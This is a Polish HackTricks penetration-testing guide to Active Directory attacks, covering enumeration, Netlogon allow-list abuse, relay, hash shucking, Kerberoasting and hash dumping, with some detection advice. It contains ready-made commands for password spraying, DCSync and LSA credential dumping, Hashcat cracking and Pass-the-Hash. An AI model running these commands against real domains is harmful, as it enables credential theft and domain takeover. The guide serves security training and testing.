# Metodyka Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni funkcję podstawowej technologii, umożliwiając **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w obrębie sieci. Został zaprojektowany z myślą o skalowaniu, ułatwiając organizowanie dużej liczby użytkowników w łatwe do zarządzania **grupy** i **podgrupy**, a także kontrolowanie **uprawnień dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy tych domen połączonych wspólną strukturą, natomiast **las** reprezentuje zbiór wielu drzew połączonych za pomocą **relacji zaufania**, tworząc najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne prawa **dostępu** i **komunikacji**.

Najważniejsze pojęcia związane z **Active Directory** obejmują:

1. **Directory** – przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – oznacza jednostki znajdujące się w katalogu, w tym **użytkowników**, **grupy** lub **foldery współdzielone**.
3. **Domain** – służy jako kontener dla obiektów katalogu; w obrębie **lasu** może współistnieć wiele domen, z których każda przechowuje własny zbiór obiektów.
4. **Tree** – grupa domen współdzielących wspólną domenę główną.
5. **Forest** – najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Usługi te obejmują:

1. **Domain Services** – centralizują przechowywanie danych i zarządzają interakcjami pomiędzy **użytkownikami** i **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – nadzorują tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – zapewniają obsługę aplikacji korzystających z katalogu za pośrednictwem **protokołu LDAP**.
4. **Directory Federation Services** – zapewniają funkcję **single sign-on**, umożliwiając uwierzytelnianie użytkowników w wielu aplikacjach webowych w ramach jednej sesji.
5. **Rights Management** – pomagają chronić materiały objęte prawami autorskimi poprzez regulowanie ich nieautoryzowanej dystrybucji i wykorzystania.
6. **DNS Service** – ma kluczowe znaczenie dla rozwiązywania **nazw domen**.

Aby uzyskać bardziej szczegółowe wyjaśnienie, sprawdź: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby nauczyć się, jak **atakować AD**, musisz naprawdę dobrze **zrozumieć proces uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Cheat Sheet

Możesz skorzystać ze strony [https://wadcoms.github.io/](https://wadcoms.github.io), aby szybko sprawdzić, jakie polecenia można uruchomić w celu enumeracji/exploitacji AD.

> [!WARNING]
> Komunikacja Kerberos **wymaga pełnej kwalifikowanej nazwy (FQDN)** do wykonywania działań. Jeśli spróbujesz uzyskać dostęp do maszyny za pomocą adresu IP, **zostanie użyty NTLM, a nie kerberos**.

## Recon Active Directory (bez creds/sesji)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych creds/sesji, możesz:

- **Wykonać Pentest sieci:**
- Przeskanować sieć, znaleźć maszyny i otwarte porty, a następnie spróbować **wykorzystać podatności** lub **pozyskać creds** z tych maszyn (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery webowe, drukarki, udziały, vpn, media itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zapoznaj się z ogólną [**metodyką Pentestingu**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby znaleźć więcej informacji na temat wykonywania tego rodzaju działań.
- **Sprawdź dostęp null i Guest w usługach smb** (nie zadziała to w nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy poradnik dotyczący enumeracji serwera SMB można znaleźć tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy poradnik dotyczący enumeracji LDAP można znaleźć tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruć sieć**
- Pozyskać creds poprzez [**podszywanie się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskać dostęp do hosta poprzez [**nadużycie relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Pozyskać creds poprzez **wystawienie** [**fałszywych usług UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnić nazwy użytkowników/imiona i nazwiska z wewnętrznych dokumentów, mediów społecznościowych oraz usług (głównie webowych) w środowiskach domenowych, a także z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz wypróbować różne **konwencje nazewnictwa username w AD (**[**przeczytaj to**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery każdego elementu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonymous SMB/LDAP enum:** Sprawdź strony dotyczące [**pentestingu SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentestingu LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy żądana jest **nieprawidłowa nazwa użytkownika**, serwer odpowie kodem **błędu Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala określić, że nazwa użytkownika jest nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** otrzymamy albo **TGT** w odpowiedzi **AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **Brak uwierzytelniania względem MS-NRPC**: Użycie auth-level = 1 (No authentication) względem interfejsu MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po powiązaniu z interfejsem MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje, bez używania jakichkolwiek creds. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten rodzaj enumeracji. Badanie można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeśli znaleziono jeden z tych serwerów w sieci, można również przeprowadzić **enumerację użytkowników**. Można na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listy nazw użytkowników można znaleźć w [**tym repozytorium github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak na etapie recon powinieneś mieć **nazwiska osób pracujących w firmie**, zebrane podczas recon przeprowadzonego wcześniej. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnie poprawnych nazw użytkowników.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Nawet po załataniu **Zerologon** na DC konta jawnie umieszczone na allow-liście nadal mogą być narażone na **legacy/vulnerable Netlogon secure-channel behavior**. Ryzykowna konfiguracja to GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca jej wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zobacz [Security Descriptors](security-descriptors.md)). Każde konto lub grupa, której przyznano odpowiedni ACE w DACL, może być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza **Everyone** na allow-liście.

Praktyczny workflow operatora:

1. **Zidentyfikuj principals na allow-liście**, sprawdzając zarówno **SYSVOL/GPO**, jak i **aktywny rejestr DC**.
2. **Rozwiąż SID-y** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom komputerów DC**, **kontom zaufania** oraz innym uprzywilejowanym komputerom.
3. Wielokrotnie próbuj **MS-NRPC / Netlogon authentication** jako konto znajdujące się na allow-liście.
4. Po pomyślnym odgadnięciu wykorzystaj **Netlogon password-setting**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg znaków).<sup>[[9]](#references)[[10]](#references)</sup>

Szybkie przykłady triage / lab z publicznego artefaktu:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Uwagi:

- **scanner** jest użyteczny, ponieważ skuteczna lista dozwolonych elementów może znajdować się w **SYSVOL**, w **registry** lub w obu tych miejscach.
- Sama ścieżka exploit jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera Domain Controller** takiego jak `DC$` jest szczególnie niebezpieczne, ponieważ zresetowanie tego hasła może bezpośrednio umożliwić szersze ścieżki **AD takeover**.
- **Wykonalność brute-force** zależy od trybu: publiczny artifact opisuje podejście meet-in-the-middle, **24-bit** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bit**.

Uwagi dotyczące wykrywania / hardeningu:

- Przeprowadź audyt polityki allow-list i usuń wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami zgodności.
- Monitoruj zdarzenia **System** na DC: **5827/5828/5829/5830/5831**, aby wykrywać odrzucane, wykryte lub jawnie dozwolone przez politykę podatne połączenia Netlogon.
- Traktuj konta znajdujące się w `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od starszego rozwiązania nie zostanie usunięta.

### Znajomość jednej lub kilku nazw użytkowników

Dobrze, więc wiesz już, że masz prawidłową nazwę użytkownika, ale nie masz haseł... W takim razie spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane za pomocą pochodnej hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy **najczęstszych haseł** dla każdego z wykrytych użytkowników — być może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
- Pamiętaj, że możesz również wykonywać **spraying na serwerach OWA**, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### Zatruwanie LLMNR/NBT-NS

Możesz być w stanie **uzyskać** pewne **hashe** challenge, zatruwając niektóre protokoły **sieci**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało Ci się przeprowadzić enumerację Active Directory, będziesz mieć **więcej adresów e-mail i lepsze zrozumienie sieci**. Możesz być w stanie wymusić [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM, aby uzyskać dostęp do środowiska AD.

### NetExec — recon oparty na workspace i sprawdzanie konfiguracji relay

- Używaj **workspace `nxcdb`**, aby przechowywać stan recon per engagement: `workspace create <name>` tworzy osobne bazy SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm`, a zebrane sekrety wyświetlaj poleceniem `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **wersję kompilacji systemu**, **wymagania dotyczące podpisywania SMB** oraz **Null Auth**. Hosty członkowskie pokazujące `(signing:False)` są **podatne na relay**, podczas gdy DC często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay do DC jest blokowany** przez signing, nadal sprawdzaj stan **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym SMB signingiem, ale wyłączonym LDAP signingiem, pozostaje możliwym celem **relay-to-LDAP** dla nadużyć takich jak **SPN-less RBCD**.

### Client-side printer credential leaks → masowa walidacja poświadczeń domenowych

- Interfejsy drukarek/webowe UI czasami **osadzają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła/devtools może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów/wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty onboardingowe w postaci plaintextu** z hasłami poszczególnych użytkowników. Podczas testów zachowuj prawidłowe pary:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** za pomocą **użytkownika null lub guest**, możesz **umieścić pliki** (takie jak plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM przeciwko Tobie**, dzięki czemu będziesz mógł **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy posiadany już hash NT jako potencjalne hasło dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force'ować długie passphrase w biletach Kerberos RC4, wyzwaniach NetNTLM lub cached credentials, przekazujesz hashe NT do trybów NT-candidate w Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po kompromitacji domeny, gdy możesz pozyskać tysiące bieżących i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shucking, gdy:

- Masz zbiór NT z DCSync, zrzutów SAM/SECURITY lub credential vaults i chcesz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwytujesz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania passphrase i natychmiast wykonać pivot za pomocą Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza wyłącznie AES, musisz powrócić do zwykłych trybów haseł.

#### Building an NT hash corpus

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać możliwie największy zestaw hashy NT (wraz z ich poprzednimi wartościami):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii znacznie poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na pozyskiwanie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Track metadata** – Zachowaj nazwę użytkownika/domeny, z której pochodzi każdy hash (nawet jeśli wordlist zawiera wyłącznie wartości hex). Dopasowane hashe od razu powiedzą Ci, który principal ponownie używa hasła, gdy Hashcat wyświetli zwycięskiego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; maksymalizuje to szansę nakładania się haseł podczas shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- Dane wejściowe NT-candidate **muszą pozostać surowymi hashami NT w formacie 32 znaków hex**. Wyłącz rule engines (bez `-r` i bez trybów hybrydowych), ponieważ modyfikowanie uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale keyspace NTLM (~30 000 MH/s na M3 Max) jest około 100 razy szybszy niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolniejszym formacie.
- Zawsze uruchamiaj **najnowszą wersję Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały wydane niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a typy AES (19600/19700) wymagają plaintextu hasła, ponieważ ich klucze są wyprowadzane za pomocą PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Example – Kerberoast RC4 (mode 35300)

1. Przechwyć bilet RC4 TGS dla docelowego SPN za pomocą użytkownika z niskimi uprawnieniami (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Wykonaj shuck biletu za pomocą listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że service account używa jednego z istniejących hashy NT.

3. Natychmiast wykonaj pivot za pomocą PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext za pomocą `hashcat -m 1000 <matched_hash> wordlists/`, jeśli będzie potrzebny.

#### Example – Cached credentials (mode 31600)

1. Zrzuć cached logons ze skompromitowanej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dotyczącą interesującego użytkownika domeny do `dcc2_highpriv.txt` i wykonaj shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Pomyślne dopasowanie zwraca hash NT już znany na Twojej liście, potwierdzając, że użytkownik cached ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo wykonaj brute-force w szybkim trybie NTLM, aby odzyskać ciąg znaków.

Dokładnie ten sam workflow stosuje się do challenge-responses NetNTLM (`-m 27000/27100`) oraz DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, PtH przez SMB/WMI/WinRM albo ponownie złamać hash NT offline za pomocą masek/reguł.



## Enumerating Active Directory WITH credentials/session

Na tym etapie musisz mieć **skompromitowane credentials lub sesję prawidłowego konta domenowego**. Jeśli masz prawidłowe credentials lub shell jako użytkownik domeny, **pamiętaj, że opcje przedstawione wcześniej nadal umożliwiają kompromitację innych użytkowników**.

Przed rozpoczęciem uwierzytelnionej enumeracji powinieneś znać **problem podwójnego przeskoku Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitacja konta to **duży krok w kierunku przejęcia całej domeny**, ponieważ będziesz mógł rozpocząć **enumerację Active Directory:**

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każdego potencjalnie podatnego użytkownika, a w przypadku [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło skompromitowanego konta, puste hasła oraz nowe obiecujące hasła.

- Możesz użyć [**CMD do wykonania podstawowego recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz również użyć [**powershell do recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz także [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md) do wyodrębnienia bardziej szczegółowych informacji
- Kolejnym świetnym narzędziem do recon w Active Directory jest [**BloodHound**](bloodhound.md). Jest **mało stealthy** (zależnie od używanych metod collection), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Znajdź, gdzie użytkownicy mogą korzystać z RDP, znajdź ścieżkę do innych grup itd.
- **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- **AdExplorer.exe** z pakietu **SysInternal** Suite to **narzędzie z GUI**, którego możesz użyć do enumeracji katalogu.
- Możesz również przeszukiwać bazę LDAP za pomocą **ldapsearch**, aby znaleźć credentials w polach _userPassword_ i _unixUserPassword_, a nawet w polu _Description_. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli używasz **Linux**, możesz również enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz również wypróbować zautomatyzowane narzędzia, takie jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

Uzyskanie wszystkich nazw użytkowników domeny z Windows jest bardzo proste (`net user /domain`, `Get-DomainUser` lub `wmic useraccount get name,sid`). W Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli ta sekcja dotycząca enumeracji wydaje się krótka, jest to najważniejsza część całości. Otwórz odnośniki (głównie dotyczące cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż poczujesz się swobodnie. Podczas assessmentu będzie to kluczowy moment, aby znaleźć drogę do DA lub stwierdzić, że nic nie da się zrobić.

### Kerberoast

Kerberoasting polega na uzyskaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i złamaniu ich szyfrowania — które opiera się na hasłach użytkowników — **offline**.

Więcej informacji znajdziesz tutaj:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Po uzyskaniu credentials możesz sprawdzić, czy masz dostęp do dowolnej **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Local Privilege Escalation

Jeśli masz skompromitowane credentials lub sesję jako zwykły użytkownik domeny i masz **dostęp** za pomocą tego użytkownika do **dowolnej maszyny w domenie**, powinieneś spróbować znaleźć sposób na **lokalną eskalację uprawnień i pozyskanie credentials**. Dzieje się tak dlatego, że tylko lokalne uprawnienia administratora pozwolą Ci **zrzucać hashe innych użytkowników** z pamięci (LSASS) oraz lokalnie (SAM).

W tej książce znajduje się kompletna strona poświęcona [**lokalnej eskalacji uprawnień w Windows**](../windows-local-privilege-escalation/index.html) oraz [**checkliście**](../checklist-windows-privilege-escalation.md). Nie zapomnij również użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Jest bardzo **mało prawdopodobne**, że znajdziesz **bilety** bieżącego użytkownika, które **dadzą Ci uprawnienia dostępu** do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Jeśli udało Ci się przeprowadzić enumerację active directory, będziesz mieć **więcej adresów email i lepsze zrozumienie sieci**. Możesz być w stanie wymusić **[relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** NTLM.

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz podstawowe dane uwierzytelniające, powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępniane w AD**. Możesz zrobić to ręcznie, ale jest to bardzo nudne i powtarzalne zadanie (tym bardziej jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (takie jak plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM przeciwko Tobie**, dzięki czemu będziesz mógł **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność pozwalała każdemu uwierzytelnionemu użytkownikowi na **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi danymi uwierzytelniającymi/sesją

**W przypadku poniższych technik zwykły użytkownik domeny nie wystarczy — do przeprowadzenia tych ataków potrzebujesz specjalnych uprawnień/danych uwierzytelniających.**

### Hash extraction

Miejmy nadzieję, że udało Ci się **przejąć** jakieś konto **lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalnej eskalacji uprawnień](../windows-local-privilege-escalation/index.html).\
Następnie należy zrzucić wszystkie hashe z pamięci i lokalnych źródeł.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

